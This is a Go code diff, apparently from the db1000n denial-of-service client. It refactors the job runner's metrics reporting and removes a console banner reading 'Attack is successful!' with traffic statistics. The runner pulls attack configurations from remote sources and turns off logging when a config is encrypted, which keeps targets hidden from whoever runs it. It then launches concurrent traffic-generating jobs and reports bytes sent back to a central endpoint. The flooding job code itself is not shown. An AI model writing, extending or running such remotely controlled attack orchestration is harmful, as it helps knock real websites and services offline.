@@ -26,13 +26,12 @@ import (
 	"bytes"
 	"context"
 	"flag"
-	"fmt"
 	"log"
 	"os"
 	"strings"
-	"text/tabwriter"
 	"time"
 
+	"github.com/google/uuid"
 	"go.uber.org/zap"
 
 	"github.com/Arriven/db1000n/src/job/config"
@@ -81,18 +80,17 @@ func NewRunner(cfgOptions *ConfigOptions, globalJobsCfg *GlobalConfig) (*Runner,
 // Run the runner and block until Stop() is called
 func (r *Runner) Run(ctx context.Context, logger *zap.Logger) {
 	ctx = context.WithValue(ctx, templates.ContextKey("global"), r.globalJobsCfg)
-
-	metrics.IncClient()
-
+	lastKnownConfig := &config.RawMultiConfig{}
 	refreshTimer := time.NewTicker(r.cfgOptions.RefreshTimeout)
 
 	defer refreshTimer.Stop()
+	metrics.IncClient()
 
 	var cancel context.CancelFunc
 
-	lastKnownConfig := &config.RawMultiConfig{}
-
 	for {
+		var reporter *metrics.Reporter
+
 		rawConfig := config.FetchRawMultiConfig(strings.Split(r.cfgOptions.PathsCSV, ","),
 			nonNilConfigOrDefault(lastKnownConfig, &config.RawMultiConfig{
 				Body: []byte(nonEmptyStringOrDefault(r.cfgOptions.BackupConfig, config.DefaultConfig)),
@@ -103,8 +101,7 @@ func (r *Runner) Run(ctx context.Context, logger *zap.Logger) {
 			log.Println("New config received, applying")
 
 			lastKnownConfig = rawConfig
-
-			metrics.Default.ResetAll()
+			reporter = metrics.NewReporter(r.globalJobsCfg.ClientID)
 
 			if cancel != nil {
 				cancel()
@@ -113,9 +110,9 @@ func (r *Runner) Run(ctx context.Context, logger *zap.Logger) {
 			if rawConfig.Encrypted {
 				log.Println("Config is encrypted, disabling logs")
 
-				cancel = r.runJobs(EncryptedContext(ctx), zap.NewNop(), cfg)
+				cancel = r.runJobs(EncryptedContext(ctx), cfg, reporter, zap.NewNop())
 			} else {
-				cancel = r.runJobs(ctx, logger, cfg)
+				cancel = r.runJobs(ctx, cfg, reporter, logger)
 			}
 		} else {
 			log.Println("The config has not changed. Keep calm and carry on!")
@@ -132,9 +129,7 @@ func (r *Runner) Run(ctx context.Context, logger *zap.Logger) {
 			return
 		}
 
-		if err := dumpMetrics(logger, r.globalJobsCfg.ClientID); err != nil {
-			logger.Debug("error reporting statistics", zap.Error(err))
-		}
+		reportMetrics(reporter, r.globalJobsCfg.ClientID, !rawConfig.Encrypted, logger)
 	}
 }
 
@@ -154,7 +149,7 @@ func nonNilConfigOrDefault(c, defaultConfig *config.RawMultiConfig) *config.RawM
 	return defaultConfig
 }
 
-func (r *Runner) runJobs(ctx context.Context, logger *zap.Logger, cfg *config.MultiConfig) (cancel context.CancelFunc) {
+func (r *Runner) runJobs(ctx context.Context, cfg *config.MultiConfig, reporter *metrics.Reporter, logger *zap.Logger) (cancel context.CancelFunc) {
 	ctx, cancel = context.WithCancel(ctx)
 
 	var jobInstancesCount int
@@ -192,9 +187,8 @@ func (r *Runner) runJobs(ctx context.Context, logger *zap.Logger, cfg *config.Mu
 			go func(i int) {
 				defer utils.PanicHandler(logger)
 
-				_, err := job(ctx, logger, r.globalJobsCfg, cfg.Jobs[i].Args)
-				if err != nil {
-					logger.Error("error running job one of the jobs",
+				if _, err := job(ctx, cfg.Jobs[i].Args, r.globalJobsCfg, reporter.NewAccumulator(uuid.NewString()), logger); err != nil {
+					logger.Error("error running job",
 						zap.String("name", cfg.Jobs[i].Name),
 						zap.String("type", cfg.Jobs[i].Type),
 						zap.Error(err))
@@ -210,32 +204,12 @@ func (r *Runner) runJobs(ctx context.Context, logger *zap.Logger, cfg *config.Mu
 	return cancel
 }
 
-func dumpMetrics(logger *zap.Logger, clientID string) error {
-	defer utils.PanicHandler(logger)
-
-	bytesGenerated := metrics.Default.Read(metrics.Traffic)
-	bytesProcessed := metrics.Default.Read(metrics.ProcessedTraffic)
-	networkStatsWriter := tabwriter.NewWriter(os.Stdout, 1, 1, 1, ' ', tabwriter.AlignRight)
-
-	if bytesGenerated > 0 {
-		fmt.Fprintln(networkStatsWriter, "\n\n!Атака проводиться успішно! Русскій воєнний корабль іди нахуй!")
-		fmt.Fprintln(networkStatsWriter, "!Attack is successful! Russian warship, go fuck yourself!")
-
-		const (
-			BytesInMegabyte             = 1024 * 1024
-			PercentConversionMultilpier = 100
-		)
-
-		fmt.Fprint(networkStatsWriter, "---------Traffic stats---------\n")
-		fmt.Fprintf(networkStatsWriter, "[\tGenerated\t]\t%.2f\tMB\t|\t%v \tbytes\n", float64(bytesGenerated)/BytesInMegabyte, bytesGenerated)
-		fmt.Fprintf(networkStatsWriter, "[\tReceived\t]\t%.2f\tMB\t|\t%v \tbytes\n", float64(bytesProcessed)/BytesInMegabyte, bytesProcessed)
-		fmt.Fprintf(networkStatsWriter, "[\tResponse rate\t]\t%.1f\t%%\n", float64(bytesProcessed)/float64(bytesGenerated)*PercentConversionMultilpier)
-		fmt.Fprint(networkStatsWriter, "-------------------------------\n\n")
-	} else {
-		fmt.Fprintln(networkStatsWriter, "[Error] No traffic generated. If you see this message a lot - contact admins")
+func reportMetrics(reporter *metrics.Reporter, clientID string, writeToConsole bool, logger *zap.Logger) {
+	if writeToConsole {
+		reporter.WriteSummary(os.Stdout)
 	}
 
-	networkStatsWriter.Flush()
-
-	return metrics.ReportStatistics(int64(bytesGenerated), clientID)
+	if err := metrics.ReportStatistics(int64(reporter.Sum(metrics.BytesSentStat)), clientID); err != nil {
+		logger.Debug("error reporting statistics", zap.Error(err))
+	}
 }
